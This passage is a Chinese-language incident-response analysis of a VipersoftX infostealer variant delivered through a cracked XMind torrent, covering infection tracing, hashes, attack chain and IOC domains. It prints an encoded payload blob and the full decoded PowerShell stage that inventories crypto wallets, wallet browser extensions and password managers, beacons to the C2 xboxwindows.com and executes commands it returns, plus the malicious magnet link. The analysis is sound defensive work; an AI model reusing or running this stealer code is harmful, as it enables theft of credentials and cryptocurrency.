6WkQ0L09GRnpZa1J6WldONllqNC9MUnNjTmpZMk5qSmtPRkovWldaNVpYTStQeTBiSEJzY05qWTJObkI1WkRZK01uODJLelltTFRZeWZ6WTdlbUkyTW1SelpUaGFjM2h4WW40dE5qSi9QVDAvTm0wYkhEWTJOalkyTmpZMk1tUnpaVTB5ZjBzMkt6WXlaSE5sVFRKL1N6WTdkRzU1WkRZa0pDMGJIRFkyTmpackd4d2JIRFkyTmpaa2MySmpaSGcyTW1SelpTMGJIR3NiSEJzY2NHTjRkV0ovZVhnMlVYTmlPME5sYzJSZlVqWnRHeHcyTmpZMmYzQTJQakpsYzJWbGYzbDRPSDl5Tmp0NGN6WTdKejgyYlJzY05qWTJOalkyTmpaa2MySmpaSGcyTW1WelpXVi9lWGc0ZjNJdEd4dzJOalkyYXhzY05qWTJOako3WlRZck5saHpZVHRaZEh4emRXSTJNVVZ2WldKemV6aGZXVGhiYzN0NVpHOUZZbVJ6ZDNzeEd4dzJOalkyTW50bE9FRmtmMkp6UGsxVWYySlZlWGhnYzJSaWMyUkxMQ3hSYzJKVWIySnpaVDVOWTM5NFlpVWtTeko3YzJKM1NXQnpaR1YvZVhnL09qWW1PallpUHkwYkhEWTJOall5ZTJVNFFXUi9Zbk5VYjJKelBpYy9MUnNjTmpZMk5qSjdaVGhCWkg5aWN6NU5WSDlpVlhsNFlITmtZbk5rU3l3c1VYTmlWRzlpYzJVK1RXTi9lR0lsSkVzeWUzTmlkMGx4WTM5eVB6bzJKam8ySWo4dEd4dzJOalkyTW5KM1luYzJLell5ZTJVNFFubFhaR1IzYno0L0xSc2NOalkyTmpKN1pUaFNmMlZtZVdWelBqOHRHeHcyTmpZMkd4dzJOalkyTW1SelpUWXJObDk0WUhsOWN6dEVjMmRqYzJWaU5qSnlkMkozTFJzY05qWTJObjl3Tmo0eVpITmxPRnB6ZUhGaWZqWTdlSE0ySWo4MmJSc2NOalkyTmpZMk5qWmlmbVI1WVRZME5DMGJIRFkyTmpackd4d2JIRFkyTmpZeVpYTmxaWDk1ZURoL2NqWXJOazFVZjJKVmVYaGdjMlJpYzJSTExDeENlVjk0WWlVa1BqSmtjMlU2TmlZL0xSc2NOalkyTm1SelltTmtlRFl5WlhObFpYOTVlRGgvY2kwYkhHc2JIQnNjY0dONGRXSi9lWGcyVVhOaU8wTm1jbmRpYzJVMmJSc2NOalkyTmpKamYzSTJLelpSYzJJN1EyVnpaRjl5TFJzY05qWTJOako3WlRZck5saHpZVHRaZEh4emRXSTJNVVZ2WldKemV6aGZXVGhiYzN0NVpHOUZZbVJ6ZDNzeEd4dzJOalkyTW50bE9FRmtmMkp6UGsxVWYySlZlWGhnYzJSaWMyUkxMQ3hSYzJKVWIySnpaVDVOWTM5NFlpVWtTeko3YzJKM1NXQnpaR1YvZVhnL09qWW1PallpUHkwYkhEWTJOall5ZTJVNFFXUi9Zbk5VYjJKelBpUS9MUnNjTmpZMk5qSjdaVGhCWkg5aWN6NU5WSDlpVlhsNFlITmtZbk5rU3l3c1VYTmlWRzlpYzJVK1RYOTRZa3N5WTM5eVB6bzJKam8ySWo4dEd4dzJOalkyZjNBMlBqSmxjMlZsZjNsNE9HTm1jbmRpY3o4MmJSc2NOalkyTmpZMk5qWXlTV05sYzJSL2VIQjVOaXMyTVRFdEd4dzJOalkyTmpZMk5tSmtielp0R3h3Mk5qWTJOalkyTmpZMk5qWXlTV05sYzJSL2VIQjVOaXMyVVhOaU8wTmxjMlJmZUhCNUxSc2NOalkyTmpZMk5qWnJHeHcyTmpZMk5qWTJOblYzWW5WK05tMGJIRFkyTmpZMk5qWTJOalkyTmpKSlkyVnpaSDk0Y0hrMkt6WlZlWGhnYzJSaVFuazdYR1Y1ZURaV2JSc2NOalkyTmpZMk5qWTJOalkyTmpZMk5uTmtaSGxrTmpZck5qSkpPRk51ZFhObVluOTVlRGhiYzJWbGQzRnpMUnNjTmpZMk5qWTJOalkyTmpZMk5qWTJObnAvZUhNMk5qWXJOakpKT0ZOdWRYTm1Zbjk1ZURoYWYzaHpMUnNjTmpZMk5qWTJOalkyTmpZMk5qWTJObmx3Y0dWellqWXJOakpKT0ZOdWRYTm1Zbjk1ZURoWmNIQmxjMkl0R3h3Mk5qWTJOalkyTmpZMk5qWnJHeHcyTmpZMk5qWTJObXNiSERZMk5qWTJOalkyVFhSdlluTk5TMHN5WTJWelpIOTRjSGsyS3paTlFuTnVZamhUZUhWNWNuOTRjVXNzTEVOQ1VDNDRVWE5pVkc5aWMyVStNa2xqWlhOa2YzaHdlVDh0R3h3Mk5qWTJOalkyTmpKN1pUaEJaSDlpY3o0eVkyVnpaSDk0Y0hrNk5pWTZOakpqWlhOa2YzaHdlVGhhYzNoeFluNC9MUnNjTmpZMk5tc2JIRFkyTmpZeWNuZGlkellyTmpKN1pUaENlVmRrWkhkdlBqOHRHeHcyTmpZMk1udGxPRkovWldaNVpYTStQeTBiSEJzY05qWTJOakprYzJVMkt6WmZlR0I1ZlhNN1JITm5ZM05sWWpZeWNuZGlkeTBiSEJzY05qWTJObjl3Tmo0eVpITmxPRnB6ZUhGaWZqWTdlbUkySWo4MmJSc2NOalkyTmpZMk5qWmlmbVI1WVRZME5DMGJIRFkyTmpackd4dzJOalkyTW5BMkt6Wk5WSDlpVlhsNFlITmtZbk5rU3l3c1FubERYM2hpSlNRK01tUnpaVG8ySmo4dEd4dzJOalkyTW1WelpXVi9lWGc0WTJaeWQySnpOaXMyUGpKd05qdDBkM2h5TmladUp6ODJPM05uTmljdEd4dzJOalkyZjNBMlBqSmtjMlU0V25ONGNXSitOanR4WWpZaVB6WnRHeHcyTmpZMk5qWTJObVJ6WW1Oa2VEWStUVUp6Ym1JNFUzaDFlWEovZUhGTExDeERRbEF1T0ZGellrVmlaSDk0Y1Q0eVpITmxPallpT2pZeVpITmxPRnB6ZUhGaWZqWTdOaUkvUHkwYkhEWTJOalpyR3h3Mk5qWTJaSE5pWTJSNE5qSjRZM3A2TFJzY2F4c2NHeHh3WTNoMVluOTVlRFpGYzJJN1EyWnlkMkp6WlRadEd4dzJOalkyWm5ka2QzczJQaHNjTmpZMk5qWTJOalpOWldKa2YzaHhTeHNjTmpZMk5qWTJOall5ZFhsN2UzZDRjaHNjTmpZMk5qOGJIRFkyTmpZeWVuOTRjMlUyS3pZeWRYbDdlM2Q0Y2pZN1pXWjZmMkkyTkhaa2RuZzBMUnNjTmpZMk5uQjVaSE4zZFg0MlBqSjZmM2h6Tm45NE5qSjZmM2h6WlQ4MmJSc2NOalkyTmpZMk5qWXlmSGwwTmlzMlJXSjNaR0k3WEhsME5qdEZkV1IvWm1KVWVubDFmVFkrVFVWMVpIOW1ZblI2ZVhWOVN5d3NWV1J6ZDJKelBrMUNjMjVpT0ZONGRYbHlmM2h4U3l3c1EwSlFMamhSYzJKRlltUi9lSEUrUGsxaWIyWnpTejQrUGsxa2MzRnpia3NzTEZ0M1luVitjMlUrTVdKa2MyQjRlVlV4T2pFNE1Ub3hSSDl4Zm1KQ2VWcHpjR0l4UHpacU5sQjVaRk4zZFg0MmJUSkpPR0IzZW1OemF6ODJPM3g1ZjNnMk1URS9Qejg0VVhOaVczTmlmbmx5WlQ0L1RTVW1JRXM0WDNoZ2VYMXpQako0WTNwNk9qWldQajR5ZW45NGN6OC9QejgvUHhzY05qWTJOalkyTmpaQmQzOWlPMXg1ZERZN1hIbDBOako4ZVhRMk8wSi9lM041WTJJMkp5WWJIRFkyTmpackd4eHJHeHdiSEhCamVIVmlmM2w0Tm5Ba1BqOGJIRzBiSERKZ0p6WXJObEZ6WWp0RFpuSjNZbk5sTFJzY05qWTJOalkyTmpaL2NEWStNbmhqZW5vMk8zaHpOakpnSno4MmJSc2NOalkyTmpZMk5qWTJOalkyUlhOaU8wTm1jbmRpYzJVMk1tQW5MUnNjTmpZMk5qWTJOalpyR3h4ckd4d2JIREppZXpZck5rMUNmM3R6WkdVNFFuOTdjMlJMTEN4NGMyRStQaVVtTmp3Mkp5WW1KajgvTFJzY01uVjBOaXMyYlRaUmMySTdSbVI1ZFhObFpUWnFOa0YrYzJSek8xbDBmSE4xWWpadE5qNCtNa2s0V0hkN2N6WTdjMmMyTVdGbGRXUi9abUl4UHpZN2VXUTJQakpKT0ZoM2UzTTJPM05uTmpGMVpYVmtmMlppTVQ4L05qdDNlSEkyUGo1TmNuZGljMkovZTNOTExDeDRlV0UyT3pZeVNUaEZZbmRrWWtKL2UzTS9PRUo1WW5kNlczOTRZMkp6WlRZN2NXSTJKejgyYXpacU5rVmllV1k3Um1SNWRYTmxaVFk3VUhsa2RYTTJheHNjUkhOeGYyVmljMlE3V1hSOGMzVmlVMkJ6ZUdJMk8xOTRabU5pV1hSOGMzVmlOakppZXpZN1UyQnplR0pZZDN0ek5qRlRlbmRtWlhOeU1UWTdWM1ZpZjNsNE5qSjFkRFliSERKaWV6aEZZbmRrWWo0L0xSc2NHeHd5WkdRMkt6WW1MUnNjWVg1L2VuTTJQakprWkRZN2VtSTJKeVkvTm0wYkhHSmtielp0R3h3Mk5qWndKQzBiSERZMk5qWTJOalkyTmpZMk1tUmtOaXMySmkwYkhHdDFkMkoxZmhzY2JSc2NOakprWkQwOUxSc2NheHNjTmpZMk5rVmlkMlJpTzBWNmMzTm1OanRGYzNWNWVISmxOaVVrTFJzY2F4c2NHeHc9
```



响应内容解码解密：  可以看到

![image-20240511184456010](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511184456010.png)

```
$meta_request = 'Z2V0IC9hcGkvdjEvN2MxOTBiNGI0NTFiODkxZGY0YTBjZTRlMmMyZmViNTU5NzU2ZmQwZGFjNzE5OWQ1MGQ4YjMyZTU0ZmJjM2FiYSBodHRwLzEuMQ0KaG9zdDogeGJveHdpbmRvd3MuY29tDQpjb25uZWN0aW9uOiBrZWVwLWFsaXZlDQphY2NlcHQtZW5jb2Rpbmc6IGd6aXANCngtZm9yd2FyZGVkLWZvcjogMTAzLjE1MS4xNzIuMjQNCmNmLXJheTogODgyMTdkZTJjZmI0OGI4MS1oa2cNCngtZm9yd2FyZGVkLXByb3RvOiBodHRwDQpjZi12aXNpdG9yOiB7InNjaGVtZSI6Imh0dHAifQ0KdXNlci1hZ2VudDogbW96aWxsYS81LjAgKHdpbmRvd3MgbnQgMTAuMDsgd2luNjQ7IHg2NDsgcnY6MTI1LjApIGdlY2tvLzIwMTAwMTAxIGZpcmVmb3gvMTI1LjANCmFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KYWNjZXB0LWxhbmd1YWdlOiB6aC1jbix6aDtxPTAuOCx6aC10dztxPTAuNyx6aC1oaztxPTAuNSxlbi11cztxPTAuMyxlbjtxPTAuMg0KdXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0czogMQ0KY2YtY29ubmVjdGluZy1pcDogMTAzLjE1MS4xNzIuMjQNCmNkbi1sb29wOiBjbG91ZGZsYXJlDQpjZi1pcGNvdW50cnk6IGhrDQoNCg==';
$meta_version = 890945858;
$meta_guid = 105662;
$meta_mutex = '623ffb00-b0f5-4069-a88b-4d612e80cb12';
$meta_ip = '162.158.179.120';
$meta_host = 'xboxwindows.com';

############################

$createdNew = $false;
$mutex = [System.Threading.Mutex]::new($true, $meta_mutex, [ref]$createdNew);
if ($createdNew -eq $false) {
    Start-Sleep -Seconds 300;
    return;
}

$_headers = [Text.Encoding]::ASCII.GetString(([type]((([regex]::Matches('trevnoC','.','RightToLeft') | ForEach {$_.value}) -join ''))).GetMethods()[306].Invoke($null, @(($meta_request)))) -split "`r`n"
$http_request = @{}; 
$http_headers = @{};
$http_request.path = ($_headers[0] -split ' ')[1];

for ($i = 1; $i -lt $_headers.Length; $i++) {
    [string[]]$h = $_headers[$i] -split ': ';
    if ($h.Length -lt 2) {
        break;
    }
    $http_headers[$h[0]] = $h[1];
}

$session = @{};
$session.id = -1;
$session.update = $true;

Add-Type -AssemblyName System.Net.Http
$client = [System.Net.Http.HttpClient]::new();
$client.Timeout = [TimeSpan]::FromMinutes(2);
$client.BaseAddress = [Uri]::new("http://$($meta_host)");


function Test-Unicode {
    param (
        $str
    )
    for ($i = 0; $i -lt $str.Length; $i++) {
        if ($str[$i] -gt 255) {
            return $true;
        }
    }
    return $false;
}

$searchPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive\Desktop",
    ([Environment]::GetFolderPath("Desktop")),
    "$env:PUBLIC\Desktop",
    "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
);

$searchEntries = @(
    [pscustomobject]@{
        root    = '%appdata%'
        targets =
        [pscustomobject]@{
            name = 'Exodus-A'
            path = 'Exodus'
        },
        [pscustomobject]@{
            name = 'Atomic-A'
            path = 'Atomic Wallet'
        },
        [pscustomobject]@{
            name = 'Electrum-A'
            path = 'Electrum'
        },
        [pscustomobject]@{
            name = 'Ledger-A'
            path = 'Ledger Live'
        },
        [pscustomobject]@{
            name = 'Jaxx-A'
            path = 'Jaxx Liberty'
        },
        [pscustomobject]@{
            name = 'com.liberty.jaxx-A'
            path = 'com.liberty.jaxx'
        },
        [pscustomobject]@{
            name = 'Guarda-A'
            path = 'Guarda'
        },
        [pscustomobject]@{
            name = 'Armory-A'
            path = 'Armory'
        },
        [pscustomobject]@{
            name = 'DELTA-A'
            path = 'DELTA'
        },
        [pscustomobject]@{
            name = 'TREZOR-A'
            path = 'TREZOR Bridge'
        },
        [pscustomobject]@{
            name = 'Bitcoin-A'
            path = 'Bitcoin'
        },
        [pscustomobject]@{
            name = 'binance-A'
            path = 'binance'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%'
        targets =
        [pscustomobject]@{
            name = 'Blockstream-A'
            path = 'Blockstream Green'
        },
        [pscustomobject]@{
            name = 'Coinomi-A'
            path = 'Coinomi'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%\Google\Chrome\User Data\Default\Extensions'
        targets =
        [pscustomobject]@{
            name = 'Metamask-C'
            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
        },
        [pscustomobject]@{
            name = 'MEWcx-C'
            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'
        },
        [pscustomobject]@{
            name = 'Coin98-C'
            path = 'aeachknmefphepccionboohckonoeemg'
        },
        [pscustomobject]@{
            name = 'Binance-C'
            path = 'fhbohimaelbohpjbbldcngcnapndodjp'
        },
        [pscustomobject]@{
            name = 'Jaxx-C'
            path = 'cjelfplplebdjjenllpjcblmjkfcffne'
        },
        [pscustomobject]@{
            name = 'Coinbase-C'
            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%\Microsoft\Edge\User Data\Default\Extensions'
        targets =
        [pscustomobject]@{
            name = 'Metamask-E'
            path = 'ejbalbakoplchlghecdalmeeeajnimhm'
        },
        [pscustomobject]@{
            name = 'Coinomi-E'
            path = 'gmcoclageakkbkbbflppkbpjcbkcfedg'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Extensions'
        targets =
        [pscustomobject]@{
            name = 'Metamask-B'
            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
        },
        [pscustomobject]@{
            name = 'MEWcx-B'
            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'
        },
        [pscustomobject]@{
            name = 'Coin98-B'
            path = 'aeachknmefphepccionboohckonoeemg'
        },
        [pscustomobject]@{
            name = 'Binance-B'
            path = 'fhbohimaelbohpjbbldcngcnapndodjp'
        },
        [pscustomobject]@{
            name = 'Jaxx-B'
            path = 'cjelfplplebdjjenllpjcblmjkfcffne'
        },
        [pscustomobject]@{
            name = 'Coinbase-B'
            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'
        }
    },
    [pscustomobject]@{
        root    = '%SystemDrive%'
        targets =
        [pscustomobject]@{
            name = 'KeePass-A'
            path = 'Program Files (x86)\KeePass Password Safe 2\KeePass.exe.config'
        },
        [pscustomobject]@{
            name = 'KeePass-B'
            path = 'Program Files\KeePass Password Safe 2\KeePass.exe.config'
        }
    },
      [pscustomobject]@{
        root    = '%localappdata%'
        targets =
        [pscustomobject]@{
            name = '1Password'
            path = '1Password'
        }
    }
);

function Get-InstallStatus {
    param (
        $appname
    )
    $versions = New-Object Collections.Generic.List[string];
    $active = 0;
    $inactive = 0;
    $rgx = New-Object 'System.Text.RegularExpressions.Regex' '\s?--load-extension=(("[^\r\n"]*")|([^\r\n\s]*))';
    $shell = New-Object -comObject WScript.Shell
    for ($searchPath_index = 0; $searchPath_index -lt $searchPaths.Count; $searchPath_index++) {
        $searchPath = $searchPaths[$searchPath_index];
        if ((Test-Path $searchPath) -eq $false) {
            continue;
        }
        $lnks = [IO.Directory]::GetFiles($searchPath, "*.lnk");
        foreach ($lnk in $lnks) {
            if ((Test-Unicode $lnk)) {
                $tmppath = [IO.Path]::GetTempFileName() + ".lnk";
                [IO.File]::Copy($lnk, $tmppath, $true);
                $lnk = $tmppath;
            }
            $lnkobj = $shell.CreateShortcut($lnk);
            $target = $lnkobj.TargetPath;
            if ([string]::IsNullOrEmpty($target)) {
                continue;
            }
            if ((Test-Path $target) -eq $false) {
                continue;
            }
            $target = (Resolve-Path -Path $target).Path.ToLower();
            if ($target.EndsWith($appname, 'OrdinalIgnoreCase')) {
                $enabled = $false;
                $arguments = $lnkobj.Arguments;
                if ($null -ne $arguments) {
                    $m = $rgx.Match($arguments);
                    if ($m.Success -eq $true) {
                        $path = $m.Groups[1].Value;
                        $path = $path.Trim('"');
                        $enabled = ((Test-Path $path) -eq $true);
                        if ($enabled) {
                            try {
                                $versionName = (Select-String -LiteralPath "$path\manifest.json" -Pattern '"version": "(.*)",').Matches.Groups[1].Value;
                                try {
                                    $versionName += "-" + (Select-String -LiteralPath "$path\manifest.json" -Pattern '"author": "(.*)",').Matches.Groups[1].Value;
                                } catch {
                                }
                                if (-not $versions.Contains($versionName)) {
                                    $versions.Add($versionName);
                                }                            
                            }
                            catch {
                            }
                        }
                    }
                }
                if ($enabled) {
                    $active++;
                }
                else {
                    $inactive++;
                }
            }
        }
    }

    if (($active -eq 0) -and ($inactive -eq 0)) {
        return $null;
    }
    elseif ($inactive -gt 0) {
        return 'NOK';
    }
    return "OK($([string]::Join(', ', $versions)))";
}

function Get-Apps {
    $results = New-Object Collections.Generic.List[string];

    $appEntries = @('chrome.exe', 'brave.exe', 'msedge.exe', 'opera.exe');
    foreach ($appEntry in $appEntries) {
        $status = Get-InstallStatus $appEntry;
        if ($null -eq $status) {
            continue;
        }
        $results.Add("$([System.IO.Path]::GetFileNameWithoutExtension($appEntry))-$($status)");
    }

    $status = Get-InstallStatus 'Opera\launcher.exe';
    if ($null -ne $status) {
        $results.Add("opera1-$($status)");
    }

    foreach ($entry in $searchEntries) {
        $rootdir = [System.Environment]::ExpandEnvironmentVariables($entry.root);
        foreach ($target in $entry.targets) {
            if ((Test-Path -Path (Join-Path -Path $rootdir -ChildPath $target.path))) {
                $results.Add($target.name)
            }
        }
    }
    return [string]::Join(', ', $results);
}

function Get-UserInfo {

    $info = @{
        os   = "";
        cm   = "$($env:USERDOMAIN)\$($env:USERNAME)";
        av   = "";
        apps = [string](Get-Apps);
        ip   = $http_headers['CF-Connecting-IP'];
        ver  = $env:_v;
    }
    return ConvertTo-Json $info -Compress;
}

function Invoke-Request {
    param (
        [byte[]]
        $buf
    )

    for ($i = 0; $i -lt $buf.Length; $i++) {
        $buf[$i] = $buf[$i] -bxor 22;
    }

    $r = $client.PostAsync("api/$([guid]::NewGuid().ToString())", [Net.Http.ByteArrayContent]::new($data)).GetAwaiter().GetResult();
    $r.EnsureSuccessStatusCode() | Out-Null;
    $res = $r.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult();
    $r.Dispose();

    for ($i = 0; $i -lt $res.Length; $i++) {
        $res[$i] = $res[$i] -bxor 22;
    }

    return $res;
}

function Get-UserID {
    if ($session.id -ne -1) {
        return $session.id;
    }
    $ms = New-Object 'System.IO.MemoryStream'
    $ms.Write([BitConverter]::GetBytes([uint32]$meta_version), 0, 4);
    $ms.WriteByte(1);
    $ms.Write([BitConverter]::GetBytes([uint32]$meta_guid), 0, 4);
    $data = $ms.ToArray();
    $ms.Dispose();
    
    $res = Invoke-Request $data;
    if ($res.Length -ne 4) {
        throw "";
    }

    $session.id = [BitConverter]::ToInt32($res, 0);
    return $session.id;
}

function Get-Updates {
    $uid = Get-UserId;
    $ms = New-Object 'System.IO.MemoryStream'
    $ms.Write([BitConverter]::GetBytes([uint32]$meta_version), 0, 4);
    $ms.WriteByte(2);
    $ms.Write([BitConverter]::GetBytes([int]$uid), 0, 4);
    if ($session.update) {
        $_userinfo = '';
        try {
            $_userinfo = Get-UserInfo;
        }
        catch {
            $_userinfo = ConvertTo-Json @{
                error  = $_.Exception.Message;
                line   = $_.Exception.Line;
                offset = $_.Exception.Offset;
            }
        }
        [byte[]]$userinfo = [Text.Encoding]::UTF8.GetBytes($_userinfo);
        $ms.Write($userinfo, 0, $userinfo.Length);
    }
    $data = $ms.ToArray();
    $ms.Dispose();

    $res = Invoke-Request $data;

    if ($res.Length -lt 4) {
        throw "";
    }
    $f = [BitConverter]::ToUInt32($res, 0);
    $session.update = ($f -band 0x1) -eq 1;
    if ($res.Length -gt 4) {
        return ([Text.Encoding]::UTF8.GetString($res, 4, $res.Length - 4));
    }
    return $null;
}

function Set-Updates {
    param (
        [string]
        $command
    )
    $lines = $command -split "`r`n";
    foreach ($line in $lines) {
        $job = Start-Job -ScriptBlock ([Scriptblock]::Create([Text.Encoding]::UTF8.GetString(([type]((([regex]::Matches('trevnoC','.','RightToLeft') | ForEach {$_.value}) -join ''))).GetMethods()[306].Invoke($null, @(($line))))))
        Wait-Job -Job $job -Timeout 10
    }
}

function f2()
{
$v1 = Get-Updates;
        if ($null -ne $v1) {
            Set-Updates $v1;
        }
}

$tm = [Timers.Timer]::new((30 * 1000));
$cb = { Get-Process | Where-Object { (($_.Name -eq 'wscript') -or ($_.Name -eq 'cscript')) -and (([datetime]::now - $_.StartTime).TotalMinutes -gt 1) } | Stop-Process -Force }
Register-ObjectEvent -InputObject $tm -EventName 'Elapsed' -Action $cb 
$tm.Start();

$rr = 0;
while ($rr -lt 10) {
try {
   f2;
           $rr = 0;
}catch
{
 $rr++;
}
    Start-Sleep -Seconds 32;
}


```



简单分析相关代码逻辑：判断本地的app及其拓展安装情况，然后发回c2：

信息回传c2：``http://xboxwindows.com/api/$guid``

![image-20240512133316448](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240512133316448.png)



如下图回传c2相关信息：

![image-20240512133157784](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240512133157784.png)

如下图，该函数判断机器上相关指定目录下是否安装如下浏览器和相关拓展![image-20240511185032401](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511185032401.png)

寻找的相关路径：

![image-20240512133527045](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240512133527045.png)

其中涉及软件判断，kepass 和1password；（过去曾批漏，VenomSoftX窃密木马技战法中曾利用这两款软件的漏洞，这里应该也是一样的）

![image-20240511190351382](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511190351382.png)



发现受害机器曾发起请求解析c2域名（xboxwindows.com）：

![image-20240515145724729](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240515145724729.png)



## 二、往前排查确认受感染由来

定位powershell进程由来，父进程 svchost：

![image-20240511110036478](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511110036478.png)

父进程启动参数：-s Schedule ，如下图，应该是计划任务起来的：

![image-20240511111027871](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511111027871.png)

排查计划任务：

发现恶意计划任务：

\Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScannerbz4k3

![image-20240511111142077](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511111142077.png)

触发器：

![image-20240511111251649](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511111251649.png)

计划任务的由来：

查看本机计划任务创建相关日志windows安全日志（602，4698，4072）：

如下图：无果

![image-20240513101743526](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240513101743526.png)

上面我们发现计划任务中的恶意ps脚本创建时间是3月21日20:12分，排查盗版、破解、第三方软件安装记录：如下图，发现之前3月21日20：09曾下载一个xmind，和破解插件；

![image-20240513102201810](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240513102201810.png)

![image-20240513102219325](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240513102219325.png)

目前相关内容都被删除了；

种子链接

```
magnet:?xt=urn:btih:2ACDD382ABE62D06D7FB7DD182F74F828ABC1EFC&dn=XMind+2022+v22.11.2677+%28x64%29+Multilingual+%2B+crack+%7Bcrackerfg%7D&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80%2Fannounce&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.pirateparty.gr%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.tiny-vps.com%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.torrent.eu.org%3A451%2Fannounce&tr=udp%3A%2F%2Fexplodie.org%3A6969%2Fannounce&tr=udp%3A%2F%2Fipv4.tracker.harry.lu%3A80%2Fannounce&tr=udp%3A%2F%2Fopen.stealth.si%3A80%2Fannounce&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.cyberia.is%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.internetwarriors.net%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.open-internet.nl%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.zer0day.to%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337%2Fannounce&tr=http%3A%2F%2Ftracker.openbittorrent.com%3A80%2Fannounce&tr=udp%3A%2F%2Fopentracker.i2p.rocks%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.internetwarriors.net%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969%2Fannounce&tr=udp%3A%2F%2Fcoppersurfer.tk%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.zer0day.to%3A1337%2Fannounce
```

查找浏览器记录，发现下载地址：

![image-20240513102940455](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240513102940455.png)





找到下载链接：（``www.1377x.to``是一个提供盗版电影、电视剧、软件和其他数字内容的网站。）

```
https://www.1377x.to/torrent/5505841/XMind-2022-v22-11-2677-x64-Multilingual-crack-crackerfg/
```



推测大概率是利用破解为由混淆受害机器的使用人，一般都会觉得报毒是因为破解的原因，所以就会信任；

下载样本后：

四个文件：

![image-20240513144829170](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240513144829170.png)

readme：

![image-20240513144452970](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240513144452970.png)



分析：

```
《Xmind-for-Windows-x64bit-22.11.2677.exe》 hash:211199a054b1ebf6063a5b3f0cf1f80d 被官方签名的白安装程序
《ErrorReport.dll》 hash：2656a4f7c113ac37df603a3c27f0ea0c  两个无效签名，签名者：(MAGIX Software GmbH)(ProteinHost) 时间戳都是22年6月17日；
《SCXTIPDILRQUR.exe》 hash:157683de4c4cbedcb74d8d66581217a7 无签名，编译时间戳 22年6月17日；
ErrorReport.dll和SCXTIPDILRQUR.exe均为木马；
```



## 三、奇怪的现象：

sysmon日志发现进程，发起恶意域名请求：

C:\Program Files (x86)\AlibabaProtect\1.0.70.1148\AlibabaProtect.exe

![image-20240511111606743](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511111606743-17163780530901.png)

排文件和进程：

进程不存在dll劫持

文件均有签名

未发现异常，这里应该是阿里的沙箱之类的操作，尝试外联的；（如下图，这两年分析红队样本的时候，总是遇到下面这个arphaCrashReport.exe来做白加黑绕过终端防护设备，一直没找到出处，原来使阿里edr上的组件，这也算是解了我两年来的一个疑惑了，颇有他乡遇故知的意思~~）

![image-20240511112307147](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511112307147-17163780530912.png)

# 0x03 总结

## 一、攻击链梳理

VipersoftX窃密木马伪装成Xmind破解插件置于``www.1377x.to``，诱使用户下载，运行后，释放运行恶意第一阶段ps脚本，并通过计划任务、注册表和文件实现持久化；第一阶段脚本会拉取特定路径缓存文件和特定路径注册表值作为代码执行；然后通过请求解析内置的一个list域名（``(wmail|fairu|bideo|privatproxy|ahoravideo)-(endpoint|blog|chat|cdn|schnellvpn).(com|xyz)``）的dns-txt记录，获取后的数据先使用内置的rsa公钥进行签名校验，接着解密拿到第二阶段的代码，并通过powershell反射调用执行；然后获取主机相关信息构造唯一id，带着唯一id回连c2：``xboxwindows.com``特定url，解密返回数据获取第三阶段代码，并执行；拉取受害机器的相关浏览器应用和插件安装情况以及密码管理软件等相关信息，带着这些信息回连c2：``xboxwindows.com``特定url，开展进一步的利用；

攻击链路图如下：

![image-20240515183528287](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240515183528287.png)

## 二、ioc:

域名：

```
wmail-endpoint.com
wmail-endpoint.xyz
wmail-blog.com
wmail-blog.xyz
wmail-chat.com
wmail-chat.xyz
wmail-cdn.com
